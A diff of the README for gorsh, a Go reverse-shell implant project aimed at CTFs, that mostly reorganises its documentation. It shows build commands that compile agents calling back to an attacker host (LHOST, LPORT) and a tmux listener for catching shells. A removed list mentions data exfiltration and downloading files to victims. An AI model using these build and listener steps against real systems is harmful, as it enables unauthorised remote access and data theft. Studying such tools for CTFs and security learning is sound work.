@@ -14,24 +14,16 @@ Make a throwaway reverse shell for things like CTFs.
 Learn about host-based OPSEC considerations when writing an implant.
 
 ## Fork Changes
-Changes after fork:
 
-* Uses tmux as a pseudo-C2-like interface, creating a new window with each agent callback
-* zipcat: zip > base64 > cat for data small/medium data exfil (zstd/x64 or gzip/x86)
-* Download files to victim with HTTP on all platform
-* Download files to victim with SMB on all windows
-* Situational Awareness output on new shells
-* Removed Meterpreter functionality
-* Removed Shellcode execution
-* Remove the use of passing power/shell commands at the gorsh prompt
-* Add common file operation commands that use go instead of power/shell
+See the [Changelog](./docs/CHANGELOG.md)
+
+## Project Notes
 
 __NOTICE__: Requires go 1.11.
+
 Also, the zStandard compression library in this project uses `cgo` and thus you'll need the mingw
 compiler on Linux if you want to compile the Windows agents. It also only supports GOARCH=amd64, so
 32-bit agents use a less efficient gzip algo.
-
-And so does the darwin64 agent, until I can figure out a sane way to compile.
 
 Roadmap:
 
@@ -45,6 +37,11 @@ Roadmap:
 
 ## Getting started
 
+Check out the [official documentation](https://golang.org/doc/install) for an intro to developing
+with Go and setting up your Golang environment (with the `$GOPATH` environment variable).
+
+Make sure to read the Makefile. It gives you a good idea of what's going on.
+
 Because this project uses `cgo` and tries to cross-compile for linux/windows/macos, you'll need a
 windows compiler. I've only tried this on Debian, but since go1.11, you just need mingw installed.
 
@@ -55,31 +52,25 @@ GOOS=windows go get github.com/audibleblink/gorsh/...
 cd $GOPATH/src/github.com/audibleblink/gorsh
 ```
 
-That's it, as far cross-compiling to Windows64 goes. While it is often required during
-cross-compilation to set variables like $CC, $CXX, $AS, $LD, ... it is not required as go1.11
-linux/amd64 picks up on the presence of the toolchain it needs.
+While it is often required during cross-compilation to set variables like $CC, $CXX, $AS, $LD, ...
+it is not required as go1.11 linux/amd64 picks up on the presence of the toolchain it needs.
 
-Make sure to read the Makefile. It gives you a good idea of what's going on.
+### Usage
 
-Check out the [official documentation](https://golang.org/doc/install) for an intro to developing
-with Go and setting up your Golang environment (with the `$GOPATH` environment variable).
-
-### Building the payload
-
-First, you'll need to generate your certs:
+First, generate your certs:
 
 ```bash
 $ make depends
 ```
 
 You can set the following environment variables to compile using `go build`:
+See possible`GOOS`and`GOARCH`variables [here](https://golang.org/doc/install/source#environment).
 
 - `GOOS`: the target OS
 - `GOARCH`: the target architecture
 - `LHOST`: the attacker IP or domain name
 - `LPORT`: the listener port
 
-See possible`GOOS`and`GOARCH`variables [here](https://golang.org/doc/install/source#environment).
 
 For the `make` targets, you only need the`LHOST`and`LPORT`environment variables.
 
@@ -91,10 +82,10 @@ $ make {windows,macos,linux}{32,64} LHOST=example.com LPORT=443
 $ make all LHOST=example.com LPOST=443
 ```
 
-[Troubleshooting](./DEVELOPING)
+[Troubleshooting](./docs/TROUBLESHOOTING.md)
 
 
-## Catching the shell
+#### Catching the shell
 
 The `make listen` target kicks off a tmux session and creates new windows with each new connection.
 Feed it a port number as LPORT.
